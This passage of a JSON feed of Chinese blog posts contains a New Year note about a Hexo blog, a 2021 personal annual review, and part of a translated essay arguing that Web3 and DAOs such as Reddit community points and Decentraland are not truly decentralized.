src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180458.png\" alt=\"image-20220114180458685\"></p>\n","link":"https://blog.yfun.top/posts/hexo-blog/install-nodejs/"},{"title":"2022: 新年快乐！","date":"2021-12-31 16:00:00","description":"\n<p>转眼间，2021 年已经过去。这一年非常忙碌，以至于博客一周年的纪念来不及写，许多文章计划停留在了 To Do 里。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%8D%9A%E5%AE%A2\" class=\"headerlink\" title=\"博客\"></a>博客</h2>\n<p>由于 Cloudflare Web Analytics 是在 2021 年 4 月份启用的，再加上后来又将统计代码去除，所以关于访问量的信息不可用。</p>\n<p>截止至 2021 年 12 月 31 日，博客共发布 15 篇文章，其中 2021 年发布 11 篇文章，原创文章 10 篇。</p>\n<p>目前采用 <code>LeanCloud + Waline</code> 的评论方式，自 7 月份被刷评论后将评论权限改为登录（支持 <code>GitHub</code> 登录），还有部分评论在迁移中丢失，实在抱歉。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>博客自 2021 年 1 月 13 日将主题改为 <code>Miracle</code>，这是一款简洁、轻量的单栏 Hexo 主题。</p>\n<p><code>Miralce</code> 目前的版本是 <code>2.0.1</code>，全新的版本去除 jQuery，进一步提升性能。</p>\n<p>GitHub 仓库：<a href=\"https://github.com/hifun-team/hexo-theme-miracle\">https://github.com/hifun-team/hexo-theme-miracle</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%9B%B4%E5%A4%9A\" class=\"headerlink\" title=\"更多\"></a>更多</h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">=&gt; ...</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2022/"},{"title":"无垠 2021 年度总结","date":"2021-12-31 08:36:10","description":"\n<p>真是忙碌的一年啊。转眼 2021 已经过去，2022 即将到来。又到了该总结这一年的时候了。</p>\n<h1>统计数据</h1>\n<p>年度总结的第一部分仍然是一些统计数据。以下数据截止 2021 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 29,073 (<span>+0.6%</span>)，年 PV 67,688 (<span>-11.61%</span>)，日均 UV 79.65，平均停留时间 3分34秒 (<span>-13.7%</span>)，平均跳出率 55% (<span>-9.8%</span>)。一年有效文章数 1 (<span>-80%</span>)，新增评论 109 条 (<span>-54.96%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog.jpg\" alt=\"\" width=\"515\" height=\"620\" class=\"aligncenter size-full wp-image-2537\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog.jpg 515w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog-249x300.jpg 249w\" sizes=\"(max-width: 515px) 100vw, 515px\"></a>\n<p>除了 UV 较去年提高 100 多之外，其他数据全部下滑。主要原因还是因为今年实在太过忙碌，只更新了一篇博客，评论区也没有怎么维护。不过目前已经有两篇新的文章在路上了，希望可以尽快写完吧。</p>\n<h2>个人主页</h2>\n<p>个人页总 UV 3,515 (<span>-18.12%</span>)，总 PV 3,929 (<span>-4.56%</span>)，日均 UV 9.63，平均停留时间 55秒 (<span>-12.7%</span>)。访问的主要来源是知乎和 GitHub。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton.jpg\" alt=\"\" width=\"515\" height=\"647\" class=\"aligncenter size-full wp-image-2538\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton.jpg 515w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton-239x300.jpg 239w\" sizes=\"(max-width: 515px) 100vw, 515px\"></a>\n<p>仍然是没有更新个人主页的一年，我也没有继续宣传这个页面，统计数据下滑大概是正常的。</p>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 4 次，新增 149 commits (<span>-54.57%</span>)，Star 数增加了 174，现有 788。</p>\n<p>终于，MDx 2.0 发布了。但是因为今年的过于忙碌，MDx 并没有得到足够的维护，版本发布周期也拉得比较长，很多 Bug 没能及时修复。希望明年可以把更多的时间花在维护 MDx 上。无论如何，还是感谢各位对于 MDx 的支持！</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>2021 大事记</h1>\n<p>说起来，2021 真的太多“第一次”了...</p>\n<ul>\n<li>一月：由于电脑电池鼓包，第一次用 iPad 外接屏幕远程桌面到服务器来考期末🌚太痛苦了</li>\n<li>一月：MDx 喜提 600 Stars</li>\n<li>三月：第一次测核酸（真的酸）</li>\n<li>三月：第一次坐上 A350！(B-309W）</li>\n<li>三月：第一次来到英国</li>\n<li>六月：第一次来到伦敦</li>\n<li>六月：第一次去猫咖撸猫🐱</li>\n<li>六月：第一次坐上 B777！(B-2025）</li>\n<li>七月：酒店隔离十四天🌚</li>\n<li>七月：MDx 喜提 700 Stars</li>\n<li>七月：第一次和猫一起住（时刻有猫撸真的爽😆）</li>\n<li>七月：入职<a href=\"https://75.team/\">奇舞团</a>实习</li>\n<li>八月：北京景点怎么这么多</li>\n<li>九月：北京景点怎么还有这么多</li>\n<li>九月：<a href=\"https://flyhigher.top/develop/2160.html\">谈谈 WebAuthn</a> 被 <a href=\"https://weibo.com/1893751011/KyipM3tOM\" rel=\"noopener noreferrer\">w3c中国微博转发</a><del>（虽然并没有人看）</del>\n</li>\n<li>九月：从奇舞团<del>跑路</del>\n</li>\n<li>九月：整了个 Stackoverflow 的复制粘贴键盘<del>，太好用了</del>\n</li>\n<li>十月：终于买了心心念念的 MSFS</li>\n<li>十一月：终于买了一台新相机</li>\n<li>十一月：第一次坐上 A380！(B-6140）</li>\n<li>十二月：第一次来到爱丁堡并和 <a href=\"https://diygod.me/\">@DIYgod</a> 面基</li>\n</ul>\n<section><div class=\"set-images-div\">\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats.jpg\" alt=\"和猫一起住的唯一问题就是手机很快会被猫片塞满\" width=\"730\" height=\"1500\" class=\"aligncenter size-full wp-image-2518\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats.jpg 730w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats-146x300.jpg 146w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats-498x1024.jpg 498w\" sizes=\"(max-width: 730px) 100vw, 730px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat.jpg\" alt=\"看到你在写前端，猫猫很担心你\" width=\"1004\" height=\"1500\" class=\"aligncenter size-full wp-image-2523\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat.jpg 1004w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat-201x300.jpg 201w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat-685x1024.jpg 685w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat-768x1147.jpg 768w\" sizes=\"(max-width: 1004px) 100vw, 1004px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv.jpg\" alt=\"高效开发工具（确信\" width=\"1500\" height=\"1019\" class=\"aligncenter size-full wp-image-2519\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv.jpg 1500w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv-300x204.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv-1024x696.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv-768x522.jpg 768w\" sizes=\"(max-width: 1500px) 100vw, 1500px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt.jpg\" alt=\"和 Ralph 在天坛\" width=\"947\" height=\"1500\" class=\"aligncenter size-full wp-image-2524\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt.jpg 947w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt-189x300.jpg 189w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt-646x1024.jpg 646w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt-768x1216.jpg 768w\" sizes=\"(max-width: 947px) 100vw, 947px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/380.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/380.jpg\" alt=\"380!\" width=\"1500\" height=\"874\" class=\"aligncenter size-full wp-image-2517\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/380.jpg 1500w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/380-300x175.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/380-1024x597.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/380-768x447.jpg 768w\" sizes=\"(max-width: 1500px) 100vw, 1500px\"></a>\n</div>\n<div class=\"set-images-div2\">\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2.jpg\" alt=\"到处玩.jpg\" width=\"1500\" height=\"1080\" class=\"aligncenter size-full wp-image-2521\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2.jpg 1500w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2-300x216.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2-1024x737.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2-768x553.jpg 768w\" sizes=\"(max-width: 1500px) 100vw, 1500px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play.jpg\" alt=\"还是到处玩.jpg\" width=\"977\" height=\"1500\" class=\"aligncenter size-full wp-image-2520\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play.jpg 977w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play-195x300.jpg 195w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play-667x1024.jpg 667w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play-768x1179.jpg 768w\" sizes=\"(max-width: 977px) 100vw, 977px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars.jpg\" alt=\"380 上的星空\" width=\"1002\" height=\"1500\" class=\"aligncenter size-full wp-image-2522\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars.jpg 1002w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars-200x300.jpg 200w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars-684x1024.jpg 684w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars-768x1150.jpg 768w\" sizes=\"(max-width: 1002px) 100vw, 1002px\"></a>\n</div>\n</section><p><span>点击图片查看描述</span></p>\n<p>对了，对于可爱的猫猫们，我整了一个 Telegram 贴纸包，你可以在这里获取：<a href=\"https://telegram.me/addstickers/huanAndDan\">https://telegram.me/addstickers/huanAndDan</a>。</p>\n<h1>跨年红包</h1>\n<p>今年的解题之旅，从下面这张图片开始：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/b.jpg\" alt=\"\" width=\"1510\" height=\"1250\" class=\"aligncenter size-full wp-image-2556\"></a>\n<p>不过，鉴于今年的题目较以往对于认真解题的人更难，我还准备了隐藏红包，在解题中收集线索即可发现隐藏红包。共有 20 个普通红包和 10 个隐藏红包。</p>\n<p>解题计划持续到东八区 2022.02.03 23:59:59 或红包被领完为止，之后我会发布题解。不过由于去年情况混乱，今年在解题过程中我一旦发现有不正常的现象就会立即停止活动。Anyway，新年快乐！祝玩得开心。</p>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报用到了 PS 和 Adobe 家的新玩具 Dimension。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1.jpg\" alt=\"\" width=\"707\" height=\"1000\" class=\"aligncenter size-full wp-image-2547\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1.jpg 1414w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-212x300.jpg 212w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-724x1024.jpg 724w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-768x1086.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-1086x1536.jpg 1086w\" sizes=\"(max-width: 707px) 100vw, 707px\"></a>\n<p>那么祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2507.html"},{"title":"[译] 不，Web3 不是去中心化","date":"2021-12-14 14:01:00","description":"\n<h2>来自译者的楔子</h2>\n<p>加密货币社区对元宇宙和 Web3 的狂热仍在继续，大量投资人和开发者前仆后继加入其中。但是，Web3 真的能实现支持者们的种种愿景吗？亦或是另一个镜中月、水中花？也许让历史照进现实，能给我们答案。<br>这是自 <a href=\"https://blog.skk.moe/post/keep-web-free-say-no-to-web3/\">Web3 系列的引子之后</a>，这个系列的第一篇文章。</p>\n<blockquote><p>原文标题：Web3 is not decentralization<br>原文链接：<a href=\"https://invisibleup.com/articles/38/\">https://invisibleup.com/articles/38/</a><br>原文作者：<a href=\"https://invisibleup.com/\">InvisibleUp</a><br>译者：<a href=\"https://skk.moe/\">Sukka</a>，首发于 <a href=\"https://blog.skk.moe/\">Sukka's Blog</a></p></blockquote>\n<p>不，真的。Web3 并不是去中心化。我觉得这应该很明显。我原本以为我不需要一整篇文章来阐述这个问题，但我想我确实需要。</p>\n<p>令我感到吃惊的是，像 Reddit、Twitter 和 Discord 这样的科技巨头突然决定全力投入到 NFT 中，以达到「去中心化」的目的，尤其是其中 Reddit 的做法令我尤为生气。在 <a href=\"https://www.coindesk.com/markets/2020/05/14/reddit-rolls-out-community-points-on-ethereum-to-incentivize-positive-behavior/\">2020 年 5 月</a>左右，他们在 <code>/r/FortniteBR</code> 和 <code>/r/CryptoCurrency</code> 中实验性的启动了一个「社区代币」系统，虽然我从未去过这两个 Subreddit，但我从一名 <a href=\"https://twitter.com/isyourguy/status/1457220590004158468\">来自 Reddit 的开发者的 Twitter 推文中</a> 得知，他们正在计划将 Reddit 的 Karma Point 转换为这些代币。</p>\n<blockquote><p>译者注：关于 Reddit 将 Karma 转变为 ERC-20 代币系统一事，我曾经在我的 Web3 系列文章与译文中引用过一篇 <a href=\"https://cointelegraph.com/news/reddit-to-reportedly-tokenize-karma-points-and-onboard-500m-new-users\">相关的新闻报道</a></p></blockquote>\n<p>在我列举的三家科技巨头中，Reddit 是走出最远的、愿景最具体的——Twitter 的为用户上传的图片添加 NFT 标签的计划依然停留在纸面上、而 Discord 在其用户的强烈反对下无限期暂停了他们的计划。因此，我在这里主要介绍 Reddit 目前已经公开的计划和路线图。简而言之，Web 1.0 是一个伟大的去中心化前沿阵地、Web 2.0 是一堆有墙的花园、有许多缺点。我完全赞同这个观点。然而，Reddit 正在加入其他公司的 Web3 的行列、准备通过分配基于以太坊的加密货币、赋予网站用户以投票权。</p>\n<p>我之后再分析这句话是什么意思，现在你只要对这句话有点印象就好了。</p>\n<h2>旧互联网上的去中心化</h2>\n<p>让我们复习一下互联网的历史，上个世纪 80 年代、互联网的起源时期。在那个年代，互联网分为两大阵营，来自 MIT、国防部和欧洲原子能研究中心（译者注：Web 之父 蒂姆·博纳斯·李 就是在欧洲原子能研究中心提出了关于互联网、HTTP 的构想）的 ARPANET，和民间的临时性的、自制的调制解调器。</p>\n<p>ARPANET（现代互联网的直接技术先驱）在设计时就明确考虑到了网络层面的冗余和路由的灵活性。如果苏联人的核武器摧毁了重要城市的战略数据中心，只要 A 与 B 两点之间仍然存在数据通路（如微波），那么电子信息就依然可以传输。这个设计也有缺点，文件分享与数据传输（译者注：指 FTP 和 Gopher。FTP 发明于 1971 年，而 HTTP 诞生于 1992 年，此时冷战已经结束、核战争的威胁已经不复存在）仍然需要服务器才能运行，这意味着如果加利福尼亚被外星人攻击了，你就无法访问来自斯坦福大学的文件。但是，诸如电子邮件、IRC、尤其是 Usenet 等协议的发展，确保了互联网上从服务器到服务器传输信息的能力、从而在整个网络上创造了一个单一的信息来源。</p>\n<p>抛开美国国防部的 ARPANET，有抱负的黑客和公司正在忙于创建公告板系统。一般的，他们会在自己的电脑上运行一个程序，其他的电脑可以通过调制解调器连接，在两台电脑之间实现了一个一对一的直接连接。但是，为了和不止一台电脑连接，你需要挂断一个电话、断开与前一台计算机的链接，然后拨打下一个号码。受限于调制解调器，只有最重要的信息会被下载，导致了孤岛的诞生，如同 Web3 支持者批判的 Web 2.0 孤岛一样。</p>\n<p>为了解决这个问题，人们设计了一些变通方法，其中一个例子就是 UUCP（译者注：BSD-based 的操作系统如 FreeBSD 和 macOS，依然保留了 UUCP 的二进制，你可以在终端中输入 <code>uucp</code> 试试），实现了从 Unix 服务器到 Unix 服务器的信息拷贝。通过登录到一个连接到一系列对等服务器的公共Unix服务器，你可以手动输入一个信息的路径，以到达一个特定的服务器或用户。早期版本的路径使用的地址类似于 <code>www-skk!sukka!moe</code>。自然而然的，随着互联网的发展，这种方法就被淘汰了。</p>\n<blockquote><p>译者注：关于 UUCP 和「一个信息的路径」的更多细节，你可以阅读我的博客上的另一篇译文 <a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>，这篇文章详细介绍了互联网和 URL 的变迁历史。</p></blockquote>\n<p>另一种方法是 FidoNet，在民间的 BBS 运营者中非常受欢迎。这是一个允许 BBS 与其他系统同步信息和数据的协议，能够将长途漫游电话费卸载到同一地区内的区间中。</p>\n<p>所有这些早期的交换协议使得互联网根本不存在中心。随着时间的推移，BBS 逐渐被 ISP 替代——ISP 允许你访问其他城市甚至国家的网络、将电子邮件发送到千里之外。其中一些 ISP 很快就发展成为了 ICP，如 AOL（美国在线）和雅虎的 GeoCites（前身为 贝弗利山互联网）。最终，围墙式花园的做法逐渐消失了，IETF 小组成立并开始制定关于互联网的公开规范标准，而 ISP 们则专注于维护和改进宽带基础设施（如建设数据中心、铺设跨洋光纤和骨干网）。</p>\n<h3>案例分析：Usenet</h3>\n<p>你可以把 Usenet 视为 Reddit 的前辈。因为它是一个拥有各种「不同新闻小组」的社区。虽然 Usenet 设计之初时的用途是在互联网上提供新闻，但是它很快被用于各种你能想到的话题。后来，Usenet 成为了传播盗版电影、软件和儿童色情的地下方法（是的，你依然可以通过类似 eternal september 这样的软件访问 Usenet）。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.6.2/usenet.png\" alt=\"usenet.png\" width=\"800\" height=\"600\"></p>\n<p>作为一个非常、非常简化的模型，你发送的信息会像电子邮件一样被发送到新闻组服务器，在那里它们会被发布给全世界的人看。你可以回复线程中的其他信息，或者直接向帖子的作者发送电子邮件。评论将以树状视图展开，与 Reddit 的评论系统非常相似。新闻组服务器可以选择托管某些新闻组，并定期与网络的其他部分同步，以保持所有内容的更新。Usenet 信息也可以与现有的 FidoNet 系统进行交换。在我看来，这在当时是一个设计得非常好的系统。</p>\n<p>不过，最大的问题是缺乏良好的管理控制。Usenet 上的大多数新闻组都是无节制的，这在 Spammer 和其他的什么人开始破坏空间的不成文规则之前、是完全没有问题的。由于 Usenet 固有的分散性质，追溯性地删除信息的工具是有限的。系统版主可以发送取消信息，这个过程可以由 <a href=\"https://en.wikipedia.org/wiki/Cancelbot\">取消机器人</a> 自动完成。这在当时被认为是有争议的，因为它被认为是侵犯了言论自由权。另一种方法是有节制的新闻组，即信息首先被送到新闻组管理员那里进行审批。</p>\n<p>由于大型二进制文件的泛滥，导致互联网服务供应商被迫拔线，再加上有太多的垃圾邮件无法正确应对，Usenet 基本上消亡了。作为回应，世界范围内高度规范的留言板和博客开始大量涌现，最终互联网巨头和大型网站诞生了，如 4chan、Reddit、Facebook 和 Twitter。</p>\n<h3>案例分析：IRC</h3>\n<p>IRC、即 Internet Relay Chat，是 20 世纪 80 年代末设计的一种即时通讯协议。最初，它被设计成每个用户都在同一个网络上，但不久之后，社区中的分裂导致了几个竞争性网络的产生，如 FreeNode（现在的 Libera Chat）、EFnet 和 IRCnet。较小的网络，如 tilde.chat 也存在。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.6.2/irc.png\" alt=\"irc.png\" width=\"800\" height=\"600\"></p>\n<p>IRC 也是一个分布式系统，在这个意义上，同一 IRC 网络中的多个服务器可以同步并主持相同的频道，并在服务器之间转发信息。你只需连接到离你最近的服务器，后端就会适当地转发信息。你几乎可以使用任何客户端来连接，因为与今天复杂的专有的协议相比，IRC 是一个简单而开放的协议。根据需要，附加机器人或「弹跳器」（机器人会保存信息供以后查看，因为 IRC 不支持查看历史信息）是很容易的，因为它们只不过是专门编程的客户端。</p>\n<p>IRC（通常）只能发送文本信息，没有很好的用户注册、信息回滚机制，也没有 MSN、Slack、Matrix 或 Discord 等较新的聊天应用程序的几乎任何其他功能。2003 年，随着更有说服力的替代品的出现，它开始衰退，但是它仍然被广泛用于开源技术社区和服务的后端。</p>\n<h3>案例分析：IPFS</h3>\n<p>IPFS（星际文件系统）是一个典型的现代分散协议的例子。它解决了文档和文件只有一个真实来源的问题，让任何人都可以托管一个文件的副本以提供网络冗余。</p>\n<p>IPFS 的工作方式有点笨拙，基本上是使用文件的哈希值作为其永久地址。有一些方法可以解决这个问题，比如 <a href=\"https://docs.ipfs.io/concepts/ipns/\">IPNS</a> 与 <a href=\"https://docs.ipfs.io/concepts/dnslink/\">DNSLink</a> 的结合，它给 DNS 条目提供了一个静态地址，可以引用位于 IPFS 上的任何文件。</p>\n<p>......这一节很短，因为没有太多的东西可以写。IPFS 主要负责文件。<a href=\"https://neocities.org/\">Neocities 有对它的支持</a>。然后是，与大部分人想象中的完全相反，绝大多数 NFT 艺术品其实都托管在 IPFS 上面。唯一真正的问题是，IPFS 上的文件并不是永久存在的。一个文件可能会在未来失踪，因为没有其余的主机没有这个文件的副本（如同 BitTorrent 无人做种一样），但这并不是一个真正可以现实地解决的问题。而它其实工作地相当好。</p>\n<h3>中场休息：言论自由和言论审查</h3>\n<p>让任何人能够主持任何事情的一个自然后果是——「他们可以主持任何事情」。你同意的东西，你不同意的东西，你认为绝对不道德的东西。我个人主张 「<a href=\"https://en.wikipedia.org/wiki/Paradox_of_tolerance\">宽容的悖论</a>」，主张伤害的声音应该被踢到路边。而令人惊讶的是，去中心化系统的人做到了这一点——如果一个网络上的某个特定群体相当有毒，社区可以简单地分叉，排除他们，并继续下去，有效地将不良行为者隔离在一个回声室中。Mastodon 的服务器屏蔽系统已经表明这是一个相当有效的解决方案，最近 FreeNode 的自我毁灭和与用户纷纷迁移到 Libera Chat 更是完美体现了这一点。</p>\n<p>当然，这也不是万无一失的。Parler 和 Kiwi Farms 是被排斥的社区的例子，它们仍然在做明显的伤害，比如延续导致 1 月 6 日袭击的阴谋论，或者<a href=\"https://en.wikipedia.org/wiki/Kiwi_Farms#Suicides_of_harassment_targets\">由于不断的骚扰而导致许多人自杀</a>。Kiwi Farms 勉强维持着与外部互联网的连接，因为他们的 DNS 和 DDoS 保护完全由 Cloudflare（唯一剩下的愿意与他们合作的公司）提供，他们的服务器托管全部由「1776 Solutions」内部完成，该 ISP 对外只能通过一条 Transit 连接。</p>\n<blockquote><p>译者注：在 Cloudflare 清退 8chan、Voxility 将向 8chan 敞开怀抱的 Epik, Inc. 和 BitMitigate 拔线后，8chan 最终也被托管到由 1776 Solutions（AS397702）提供的服务器。如果作为本文的读者你也是一名 ISP 从业者，我在这里倡议你在你的网络中为任何通往 AS397702 的路由设置黑洞。</p></blockquote>\n<p>归根结底，我们试图用技术解决社会文化问题，这几乎是不可能的。真正的解决方案是让人们不要成为可怕的偏执者，而我对如何实现这一点没有丝毫头绪。</p>\n<h2>Web3 的「去中心化」概念</h2>\n<p>在过去的 3600 字中，我已经花了太多的时间去研究 20-40 年前的协议。是时候让我们回到现代了。在新兴的加密货币领域，存在着「DAO」的概念，即去中心化的自治组织。<a href=\"https://ethereum.org/en/dao/\">Ethereum.org</a> 将其描述为「像一个互联网原生企业，由其成员集体拥有和管理」。从表面上看，这听起来很像共产主义、或是苏联的「农村合作社」运动。</p>\n<p>以太坊作为一种加密货币，主要存在于以太坊虚拟机上执行代码。这是一个非常奇怪的架构（基于堆栈，1024 深度，256 位比特），其状态在全球每个以太坊矿工之间共享，其输入和输出是代币，要么是可替代的（如以太坊货币），要么是不可替代的。</p>\n<p>通过智能合约在区块链上永久存储硬规则的组织，你可以在项目上花费任何货币之前强制要求投票。所说的投票（以及代码和资金和其他一切）将是完全透明的，而且组成 DAO 的智能合约将是不可改变的。</p>\n<p>虽然我可以讨论智能合约的优点，但是不可忽视的就是他们的陷阱。例如，最大的 DAO —— <a href=\"https://en.wikipedia.org/wiki/The_DAO_(organization)\">The DAO</a>，在上线伊始就因为代码 Bug 而被黑客攻击、所有的资金全部化为乌有，以太坊网络被迫硬分叉来保护投资者的合约。当然，相比继续讨论 DAO 的失败案例，我们还是讨论一下这些实践是如何运作的吧。</p>\n<h3>案例分析：Reddit 社区代币</h3>\n<p>让我们把这一切带回我们开始的地方：Web3 的趋势与互联网上的社交媒体巨头。正如我之前所说，Reddit 是最有兴趣加入 DAO 并开始称自己为 「去中心化」的网站，所以我们将从那里开始。</p>\n<p>这里要做的明显比较是，Reddit 是一个类似于 Usenet 的中心化网站。Reddit 承载着 Subreddit，并提供审核工具，既包括 Upvote / Downvote 的形式，也包括实际的版主形式。在 Reddit 上，严格禁止操纵 Upvote / Downvote 的行为，网站管理员使用自动化工具禁止任何人这样做。这为子版块的社区创造了一种决定哪些内容是最好的方式，并将这些优质内容推广到前面，无论他们是一个偶然的潜水者还是一个活跃的成员发表的。这是 Reddit 运作的基础，到目前为止，它运作得相当好。</p>\n<p>随着社区积分的引入，Reddit 声称他们允许会员「拥有他们喜欢的社区的一部分」，就像股东拥有他们喜欢的公司的一部分一样。积分是衡量声誉的一个标准，是用于投票或福利的货币，如徽章、表情符号、GIF 等，以炫耀你的财富。投票是不具约束力的公投，采用一人一票和每点一票的方式计算。在投票过程中，积分不会被消耗。每隔四周，Reddit 网站会公布每个用户的名单，他们获得了多少 Karma，以及他们将获得多少积分作为补偿。对这个名单的修改可以用积分投票的方法提出。</p>\n<p>这里应该很明显的一点是，这根本就不是去中心化。因为你甚至不能在 Reddit 的系统中投票选举新版主。当然，你也不能建立属于你自己的 Subreddit，并在那里建立一个社区；或者从 Reddit 主网络中分叉出来，创建一套新的独立子版块；或者规避 Reddit 网站管理员的意愿；或者逃避 Reddit 是一个需要盈利的企业的事实、而让用户购买假的互联网积分、并让用户产生自己拥有控制的错觉。</p>\n<h3>案例分析：Decentraland</h3>\n<p><img src=\"https://npm.elemecdn.com/sks@0.6.2/decentraland.jpg\" alt=\"decentraland.png\" width=\"1207\" height=\"682\"></p>\n<p>抛开 Reddit，现在让我们请出 <a href=\"https://decentraland.org/\">Decentraland</a>。这是一个用于创建虚拟世界的 DAO，这个概念如今也被称为「元宇宙」。</p>\n<p>Decentraland 允许用户对 Decentraland 生态系统内的各种政策和变量进行投票，例如增加新的可穿戴设备，对某些项目的拨款，市场费用，允许使用的基础设施等。还存在一个安全顾问委员会、有权力扔掉现有的合约、改用修复了漏洞的合约。<a href=\"https://governance.decentraland.org/\">你可以在这里查看这些提案的一些例子</a>。一个特别有趣的是这个拨款提案，<a href=\"https://governance.decentraland.org/proposal/?id=47e1bb80-4139-11ec-be0c-afec86cba5e5\">以增加对一个被称为 IPSME 的元宇宙协议的支持</a>，这是我想改天进一步调查的事情。</p>\n<p>Decentraland 从根本上说是在一个被称为 MANA 的可替换代币上运行的，它被用于所有系统内的交易。虽然投票是使用 <a href=\"https://docs.snapshot.org/\">Snapshot</a> 进行的，没有交易费用（Gas），<a href=\"https://docs.decentraland.org/decentraland/what-do-you-need-to-participate/\">但你的投票权是由你拥有的游戏中的货币数量加权的</a>。这（在理论上）<strong>使已建立的富裕用户比新建立的贫穷账户更重要</strong>，使用的系统非常类似于标准加密货币中的股权证明工作。</p>\n<p>虽然我不能证明 Decentraland 遵循了这一点，但 DAO 中一个常见的投票结构是「<a href=\"https://en.wikipedia.org/wiki/Quadratic_voting\">平方投票法</a>」。这是为了判断一个人的偏好程度，而不是单纯的二元 是 / 